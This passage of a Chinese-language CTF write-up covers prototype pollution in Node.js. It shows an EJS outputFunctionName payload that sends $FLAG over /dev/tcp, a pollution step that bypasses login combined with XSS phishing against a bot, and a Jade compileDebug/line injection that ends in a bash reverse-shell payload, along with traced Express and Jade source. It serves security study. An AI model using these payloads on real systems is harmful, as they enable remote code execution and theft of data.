    }
  * 解法2. outputFunctionName
    if (opts.outputFunctionName) {
    prepended += ' var ' + opts.outputFunctionName + ' = __append;' + '\n';
    }
payload
>
> {"type":"test","content":{"constructor":{"prototype":{"outputFunctionName":"a=1;process.mainModule.require('child_process').exec('bash
> -c \"echo $FLAG>/dev/tcp/xxxxx/xx\"')//"}}}}
这个要反弹shell，我没成功
  * 解法3 污染绕过登录+xss
注册，向add 提交
    {"constructor":{"prototype":{"login":true,"userid":1}}}
提交六次会进行合并  
因为req.session.login 和req.session.userid 没定义 是`undefined`
    function auth(req,res,next){
        // var session = req.session;
        if(!req.session.login || !req.session.userid ){
            res.redirect(302,"/login");
        } else{
            next();
        }    
    }
当`req.session.login`和`req.session.userid`属性没有定义，会去找`req.session.__proto__.login`和`req.session.__proto__.userid`，如果不存在，再找`req.__proto__.login`
……
当污染了`{}`，会导致所有未定义的对象的`login`全都为`true`
然后看bot源码
    usernameForm = client.find_element_by_xpath("//input[@name='username']")
    passwordForm = client.find_element_by_xpath("//input[@name='password']")
我们需要插入让其跳转我们构造的界面
前端`jquery
                      [Tue Jan 11 17:32:52 9] [info] StoreHtml init success .....
设置`content`为``
或者form表单，将action设置为服务器地址，就可以收密码了，也就是flag
## 3\. Jade
参考自vk师傅的[文章](https://xz.aliyun.com/t/7025)
环境
server.js
    const express = require('express');
    const lodash = require('lodash');
    const path = require('path');
    var bodyParser = require('body-parser');
    const app =  express();
    var router = express.Router();
    app.set('view engine', 'jade');
    app.set('views', path.join(__dirname, 'views'));
    app.use(bodyParser.json({ extended: true }));
    app.get('/',function (req, res) {
        res.send('Hello World');
    })
    app.post('/post',function (req, res) {
        var body = JSON.parse(JSON.stringify(req.body));
        var a = {};
        var copybody = lodash.merge(a,body);
        console.log(a.name);
        res.render('index', {
            title: 'HTML',
            name: a.name || ''
        });
})
app.listen(3000, () => console.log('Example app listening on port
 !'))
res.render 下断点
    res.render = function render(view, options, callback) {
      var app = this.req.app;
      var done = callback;
      var opts = options || {};
      var req = this.req;
      var self = this;
      // support callback function as second arg
      if (typeof options === 'function') {
        done = options;
        opts = {};
      }
      // merge res.locals
      opts._locals = self.locals;
      // default callback to respond
      done = done || function (err, str) {
        if (err) return req.next(err);
        self.send(str);
      };
      // render
      app.render(view, opts, done);
    };
app.render
    app.render = function render(name, options, callback) {
      var cache = this.cache;
      var done = callback;
      var engines = this.engines;
      var opts = options;
      var renderOptions = {};
      var view;
      // support callback function as second arg
      if (typeof options === 'function') {
        done = options;
        opts = {};
      }
      // merge app.locals
      merge(renderOptions, this.locals);
      // merge options._locals
      if (opts._locals) {
        merge(renderOptions, opts._locals);
      }
      // merge options
      merge(renderOptions, opts);
      // set .cache unless explicitly provided
      if (renderOptions.cache == null) {
        renderOptions.cache = this.enabled('view cache');
      }
      // primed cache
      if (renderOptions.cache) {
        view = cache[name];
      }
      // view
      if (!view) {
        var View = this.get('view');
        view = new View(name, {
          defaultEngine: this.get('view engine'),
          root: this.get('views'),
          engines: engines
        });
        if (!view.path) {
          var dirs = Array.isArray(view.root) && view.root.length > 1
            ? 'directories "' + view.root.slice(0, -1).join('", "') + '" or "' + view.root[view.root.length - 1] + '"'
            : 'directory "' + view.root + '"'
          var err = new Error('Failed to lookup view "' + name + '" in views ' + dirs);
          err.view = view;
          return done(err);
        }
        // prime the cache
        if (renderOptions.cache) {
          cache[name] = view;
        }
      }
      // render
      tryRender(view, renderOptions, done);
    };
tryRender
    function tryRender(view, options, callback) {
      try {
        view.render(options, callback);
      } catch (err) {
        callback(err);
      }
    }
view.render
    View.prototype.render = function render(options, callback) {
      debug('render "%s"', this.path);
      this.engine(this.path, options, callback);
    };
exports.__express
    exports.__express = function(path, options, fn) {
      if(options.compileDebug == undefined && process.env.NODE_ENV === 'production') {
        options.compileDebug = false;
      }
      exports.renderFile(path, options, fn);
    }
renderFile
    exports.renderFile = function(path, options, fn){
      // support callback API
      if ('function' == typeof options) {
        fn = options, options = undefined;
      }
      if (typeof fn === 'function') {
        var res
        try {
          res = exports.renderFile(path, options);
        } catch (ex) {
          return fn(ex);
        }
        return fn(null, res);
      }
      options = options || {};
      options.filename = path;
      return handleTemplateCache(options)(options);
    };
handleTemplateCache
    function handleTemplateCache (options, str) {
      var key = options.filename;
      if (options.cache && exports.cache[key]) {
        return exports.cache[key];
      } else {
        if (str === undefined) str = fs.readFileSync(options.filename, 'utf8');
        var templ = exports.compile(str, options);
        if (options.cache) exports.cache[key] = templ;
        return templ;
      }
    }
exports.compile
    exports.compile = function(str, options){
      var options = options || {}
        , filename = options.filename
          ? utils.stringify(options.filename)
          : 'undefined'
        , fn;
      str = String(str);
      var parsed = parse(str, options);
      if (options.compileDebug !== false) {
        fn = [
            'var jade_debug = [ new jade.DebugItem( 1, ' + filename + ' ) ];'
          , 'try {'
          , parsed.body
          , '} catch (err) {'
          , '  jade.rethrow(err, jade_debug[0].filename, jade_debug[0].lineno' + (options.compileDebug === true ? ',' + utils.stringify(str) : '') + ');'
          , '}'
        ].join('\n');
      } else {
        fn = parsed.body;
      }
      fn = new Function('locals, jade', fn)
      var res = function(locals){ return fn(locals, Object.create(runtime)) };
      if (options.client) {
        res.toString = function () {
          var err = new Error('The `client` option is deprecated, use the `jade.compileClient` method instead');
          err.name = 'Warning';
          console.error(err.stack || /* istanbul ignore next */ err.message);
          return exports.compileClient(str, options);
        };
      }
      res.dependencies = parsed.dependencies;
      return res;
    };
compile -> parse -> compiler.compile
    compile: function(){
      this.buf = [];
      if (this.pp) this.buf.push("var jade_indent = [];");
      this.lastBufferedIdx = -1;
      this.visit(this.node);
      if (!this.dynamicMixins) {
        // if there are no dynamic mixins we can remove any un-used mixins
        var mixinNames = Object.keys(this.mixins);
        for (var i = 0; i  {" **proto** ":{"compileDebug":1,"self":1,"line":"console.log('test
> inject')"}}
RCE:
> {" **proto**
> ":{"compileDebug":1,"self":1,"line":"global.process.mainModule.require('child_process').execSync('bash
> -c \"bash -i >& /dev/tcp/ip/port 0>&1\"')"}}
## Referfer
)